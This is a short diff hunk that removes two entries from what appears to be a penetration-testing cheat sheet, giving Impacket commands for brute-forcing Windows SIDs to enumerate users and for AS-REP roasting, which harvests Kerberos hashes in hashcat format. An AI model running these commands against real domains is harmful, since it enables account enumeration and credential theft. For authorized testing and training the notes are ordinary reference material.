@@ -1,5 +1,0 @@
-lookupsid.py performs bruteforcing of Windows SID’s to identify users/groups on the remote target
-python lookupsid.py domain/username:password@ip
-
-GetNPUsers.py will attempt to harvest the non-preauth AS_REP responses for a given list of usernames
-python GetNPUsers.py 'domain/' -usersfile users -format hashcat -outputfile hashes -dc-ip ip
